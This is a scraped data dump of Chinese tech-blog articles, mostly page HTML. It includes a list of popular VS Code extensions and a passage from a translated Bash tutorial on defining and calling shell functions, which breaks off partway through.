    \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/506f77aba037cb2bd78064b80470760038a6d491.jpg"}
{"title": "2018 年最受欢迎的 VS Code 扩展插件合集", "url": "http://blog.jobbole.com/114319/", "create_date": "2018/08/24", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/08/ab5348ee803d45ffeb8d5cd807d2e478.jpg"], "url_object_id": "61183b365bdc8d4e434426c114a84fb6", "praise_nums": 1, "fav_nums": 1, "comment_nums": 0, "tags": "工具与资源,Visual Studio Code", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.oschina.net/news/99266/most-popular-vscode-extensions-in-2018\">开源中国-达尔文</a>   </div><p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/ab5348ee803d45ffeb8d5cd807d2e478.jpg\" alt=\"\" width=\"716\" height=\"297\"></p>\n<p>VS Code 是一个出色的代码编辑器，但真正使它强大的是它可用的扩展。 在这篇文章中，我分享了一些我最喜欢的 VS Code 扩展，同时使用 VS Code 开发 Web 应用程序。</p>\n<ul>\n<li><a href=\"https://marketplace.visualstudio.com/items?itemName=WakaTime.vscode-wakatime\" target=\"_blank\">WakaTime</a> – 根据编程活动自动生成度量标准，代码检测和时间跟踪。</li>\n<li><a href=\"https://marketplace.visualstudio.com/items?itemName=eamodio.gitlens\" target=\"_blank\">GitLens</a> – GitLens 增强了 Visual Studio Code 中内置的 Git 功能。例如 commits 搜索，历史记录和和查看代码作者身份，还能通过强大的比较命令获得有价值的见解等等。</li>\n<li><a href=\"https://marketplace.visualstudio.com/items?itemName=humao.rest-client\" target=\"_blank\">REST Client</a> – REST 客户端允许您直接发送 HTTP 请求并在 Visual Studio Code 中查看响应。</li>\n<li><a href=\"https://marketplace.visualstudio.com/items?itemName=christian-kohler.npm-intellisense\" target=\"_blank\">Npm Intellisense</a> – Visual Studio Code 插件，用于在 import 语句中自动填充 npm 模块。</li>\n<li><a href=\"https://marketplace.visualstudio.com/items?itemName=streetsidesoftware.code-spell-checker\" target=\"_blank\">Code Spell Checker</a> – 一个与 camelCase 代码配合使用的基本拼写检查程序。此拼写检查程序可以帮助捕获常见的拼写错误，同时保证减少误报的数量。</li>\n<li><a href=\"https://marketplace.visualstudio.com/items?itemName=ms-azuretools.vscode-azurestorage\" target=\"_blank\">Azure Storage</a> – Azure Storage 是微软 Azure 云提供的云端存储解决方案，当前支持的存储类型有 Blob、Queue、File 和 Table。按照<a href=\"https://code.visualstudio.com/tutorials/static-website/getting-started\">本教程</a>从 VS Code 部署 Web 应用程序到 Azure 存储。</li>\n<li><a href=\"https://marketplace.visualstudio.com/items?itemName=sdras.night-owl\" target=\"_blank\">Night Owl</a> – 一个非常适合夜猫子的 VS Code 主题。像是为喜欢深夜编码的人精心设计的。</li>\n<li><a href=\"https://marketplace.visualstudio.com/items?itemName=alefragnani.project-manager\" target=\"_blank\">Project Manager</a> – 它可以帮助您轻松访问项目。您可以利用它定义自己的收藏项目，或选择自动检测 VSCode 项目，Git，Mercurial 和 SVN 存储库。</li>\n<li><a href=\"https://marketplace.visualstudio.com/items?itemName=Gruntfuggly.todo-tree\" target=\"_blank\">Todo Tree</a> – 此扩展可以快速搜索（使用 ripgrep）您的工作区以获取 TODO 和 FIXME 等注释标记，并在资源管理器窗格的树视图中显示。 单击树中的 TODO 将打开文件并将光标放在包含 TODO 的行上。</li>\n<li><a href=\"https://marketplace.visualstudio.com/items?itemName=ChakrounAnas.turbo-console-log\" target=\"_blank\">Turbo Console Log</a> – 自动执行编写日志消息的操作，此扩展使调试更加容易。</li>\n</ul>\n<p>你还知道哪些很酷的 VS Code 扩展插件？欢迎评论分享。</p>\n<p>英文作者：RICARDO</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114319\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114319votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114319\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/6dd1f4992a88b242e6d018abbc6f249ffd81c9e4.jpg"}
{"title": "如何在 Linux Shell 编程中定义和使用函数", "url": "http://blog.jobbole.com/114329/", "create_date": "2018/08/29", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/08/6c675d44b9dd5ed6bd448d1d9d31c4eb.jpg"], "url_object_id": "d79926cf0a9664a977f6983c096c697f", "praise_nums": 1, "fav_nums": 0, "comment_nums": 0, "tags": "IT技术,Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.linuxtechi.com/define-use-functions-linux-shell-script/\">Pradeep Kumar</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9954-1.html\">Linux中国/LuMing</a>   </div><p>函数是一段可复用的代码。我们通常把重复的代码放进函数中并且在不同的地方去调用它。库是函数的集合。我们可以在库中定义经常使用的函数，这样其它脚本便可以不再重复代码而使用这些函数。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/6c675d44b9dd5ed6bd448d1d9d31c4eb.jpg\"></p>\n<p>本文我们将讨论诸多关于函数的内容和一些使用技巧。为了方便演示，我将在 Ubuntu 系统上使用 <strong>Bourne Again SHell (Bash)</strong>。</p>\n<h3 id=\"toc_1\">调用函数</h3>\n<p>在 Shell 中调用函数和调用其它命令是一模一样的。例如，如果你的函数名称为 <code>my_func</code>，你可以在命令行中像下面这样执行它：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670a9ffb0115267834\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ my_func</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffb0115267834-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670a9ffb0115267834-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">my_func</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>如果你的函数接收多个参数，那么可以像下面这样写（类似命令行参数的使用）：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670a9ffb9469609874\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ my_func arg1 arg2 arg3</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffb9469609874-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670a9ffb9469609874-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">my_func </span><span class=\"crayon-e\">arg1 </span><span class=\"crayon-e\">arg2 </span><span class=\"crayon-v\">arg3</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h3 id=\"toc_2\">定义函数</h3>\n<p>我们可以用下面的语法去定义一个函数：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670a9ffbd099679888\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfunction function_name {\r\n    Body of function\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffbd099679888-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670a9ffbd099679888-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffbd099679888-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670a9ffbd099679888-1\"><span class=\"crayon-t\">function</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">function_name</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670a9ffbd099679888-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">Body </span><span class=\"crayon-e\">of </span><span class=\"crayon-t\">function</span></div><div class=\"crayon-line\" id=\"crayon-5bab670a9ffbd099679888-3\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>函数的主体可以包含任何有效的命令、循环语句和其它函数或脚本。现在让我们创建一个简单的函数，它向屏幕上显示一些消息（注：直接在命令行里写）。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670a9ffc1602848686\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfunction print_msg {\r\n    echo \"Hello, World\"\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffc1602848686-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670a9ffc1602848686-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffc1602848686-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670a9ffc1602848686-1\"><span class=\"crayon-t\">function</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">print_msg</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670a9ffc1602848686-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Hello, World\"</span></div><div class=\"crayon-line\" id=\"crayon-5bab670a9ffc1602848686-3\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>现在，让我们执行这个函数：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670a9ffc4663195679\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ print_msg\r\nHello, World</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffc4663195679-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670a9ffc4663195679-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670a9ffc4663195679-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">print_msg</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670a9ffc4663195679-2\"><span class=\"crayon-v\">Hello</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">World</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>不出所料，这个函数在屏幕上显示了一些消息。</p>\n<p>在上面的例子中，我们直接在终端里创建了一个函数。这个函数也可以保存到文件中。如下面的例子所示。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670a9ffc8774853167\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#!/bin/bash\r\nfunction print_msg {\r\n    echo \"Hello, World\"\r\n}\r\nprint_msg</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffc8774853167-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670a9ffc8774853167-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffc8774853167-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670a9ffc8774853167-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffc8774853167-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670a9ffc8774853167-1\"><span class=\"crayon-p\">#!/bin/bash</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670a9ffc8774853167-2\"><span class=\"crayon-t\">function</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">print_msg</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab670a9ffc8774853167-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Hello, World\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670a9ffc8774853167-4\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5bab670a9ffc8774853167-5\"><span class=\"crayon-v\">print_msg</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>我们已经在 <code>function.sh</code> 文件中定义了这个函数。现在让我们执行这个脚本：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670a9ffcb789525599\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ chmod +x function.sh\r\n$ ./function.sh\r\nHello, World</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffcb789525599-1\">1</div><div class=\"crayon-num 